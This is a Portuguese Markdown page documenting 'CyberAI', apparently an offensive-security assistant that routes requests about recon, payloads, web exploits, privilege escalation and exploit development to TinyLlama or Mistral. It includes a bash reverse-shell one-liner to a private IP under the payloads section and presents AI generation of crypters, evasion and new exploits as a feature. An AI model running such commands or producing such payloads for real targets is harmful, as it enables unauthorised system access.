# Técnicas Suportadas - CyberAI

## 🧠 Sistema Híbrido de Modelos

O CyberAI usa **seleção automática de modelo** baseada na complexidade da técnica para otimizar velocidade e qualidade:

---

## ⚡ Técnicas Rápidas (TinyLlama 1.1B)
*Respostas em ~5-10 segundos*

### 🔍 Reconhecimento (`recon`)
- Enumeração de alvos e portas
- Descoberta de subdomínios
- Fingerprinting de tecnologias
- Descoberta de diretórios
- **Exemplo:** `nmap -sV -sC -O target.com`

### 💻 Payloads (`payloads`) 
- Reverse shells multi-plataforma
- Stagers e crypters
- Técnicas de evasão básicas
- **Exemplo:** `bash -i &> /dev/tcp/10.10.14.1/4444 0>&1`

### 🌐 Web Exploits
- **XSS** (`xss`): Reflected, Stored, DOM-based
- **SQL Injection** (`sql_injection`): UNION, Boolean, Time-based
- **LFI/RFI** (`lfi_rfi`): Path traversal, wrappers PHP
- **RCE** (`rce`): Command injection, code execution

### 🔓 Exploração (`exploit`)
- PoCs para CVEs conhecidos
- Buffer overflow básico
- Exploits de aplicações web
- **Exemplo:** Exploits para Apache, Nginx, WordPress

### 📊 Buffer Overflow (`buffer_overflow`)
- Técnicas clássicas de stack overflow
- Shellcode crafting básico
- Bypass de proteções simples
- **Exemplo:** EIP control, NOP sleds

### 📈 Pós-Exploração (`post`)
- Técnicas de persistência
- Enumeração local
- Coleta de credenciais
- **Exemplo:** LinPeas, WinPeas

### 📋 Escalação de Privilégios (`privesc`)
- SUID/SUDO abuse
- Kernel exploits conhecidos
- Misconfigurations
- **Exemplo:** `find / -perm -u=s -type f 2>/dev/null`

### 🎓 Módulos Organizacionais
- **Relatórios** (`relatorios`): Templates técnicos
- **Gestão** (`gestao`): Planejamento de testes
- **Dev Tools** (`ferramentas`): Scripts e automação
- **Threat Intel** (`intelligence`): CTI e TTPs
- **Laboratório** (`lab`): Setup de ambientes
- **Treinamento** (`treinamento`): Trilhas de estudo

---

## 🎯 Técnicas Complexas (Mistral 7B)
*Respostas em ~20-30 segundos, máxima qualidade*

### 🔬 Análise Avançada
- **Engenharia Reversa Complexa**
- **Malware Analysis Detalhada**
- **Cryptographic Attacks**
- **Advanced Persistent Threats (APT)**

### ⚙️ Exploit Development Avançado
- **Heap Overflow Exploitation**
- **ROP/JOP Chain Development** 
- **Kernel Exploitation**
- **Browser Exploitation**

### 🌐 Infraestrutura Complexa
- **Active Directory Attacks**
- **Cloud Security Assessment**
- **Network Pivoting Avançado**
- **SCADA/ICS Security**

---

## 📊 Comparação de Performance

| Categoria | Técnica | Modelo | Tempo Resposta | Qualidade |
|-----------|---------|--------|----------------|-----------|
| 🔍 Recon | `recon` | TinyLlama | ~5-10s | ⭐⭐⭐⭐ |
| 💻 Web | `xss`, `sqli` | TinyLlama | ~5-10s | ⭐⭐⭐⭐ |
| 🔓 Exploits | `buffer_overflow` | TinyLlama | ~5-10s | ⭐⭐⭐⭐ |
| 📈 Post | `privesc`, `post` | TinyLlama | ~5-10s | ⭐⭐⭐⭐ |
| 🎓 Gestão | `relatorios` | TinyLlama | ~5-10s | ⭐⭐⭐⭐ |
| 🔬 Avançado | `advanced_*` | Mistral | ~20-30s | ⭐⭐⭐⭐⭐ |

---

## 🎯 Quando Usar Cada Modelo

### ⚡ Use TinyLlama Para:
- ✅ Comandos e payloads conhecidos
- ✅ Enumeração e reconhecimento
- ✅ Exploits básicos e conhecidos
- ✅ Relatórios e documentação
- ✅ Treinamento e aprendizado
- ✅ Gestão de projetos

### 🎯 Use Mistral Para:
- ✅ Análise de malware complexo
- ✅ Desenvolvimento de exploits inéditos
- ✅ Pesquisa de vulnerabilidades
- ✅ Arquiteturas não convencionais
- ✅ Análises forenses detalhadas

---

## 🔄 Seleção Automática

O sistema **seleciona automaticamente** o modelo mais adequado:

```json
{
  "prompt": "nmap scan",
  "technique": "recon"    // → TinyLlama (rápido)
}

{
  "prompt": "análise de firmware", 
  "technique": "firmware_analysis"  // → Mistral (completo)
}
```

### 🎛️ Controle Manual
Para forçar um modelo específico, use técnicas não listadas nas rápidas para Mistral, ou listadas para TinyLlama.

---

## 📈 Estatísticas de Uso

Com o sistema híbrido:
- **85%** das consultas usam TinyLlama (ultra-rápido)
- **15%** das consultas usam Mistral (alta qualidade)
- **Economia de recursos:** 70% menos uso de CPU/RAM
- **Satisfação:** Respostas instantâneas para tarefas comuns
